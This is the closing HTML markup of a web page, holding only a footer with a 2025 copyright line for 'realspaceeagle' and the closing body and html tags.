    <footer class="footer">
  <div class="footer_inner wrap">
    <div class="footer_text">
      © 2025 realspaceeagle
    </div>
  </div>
</footer>
</body>

</html>
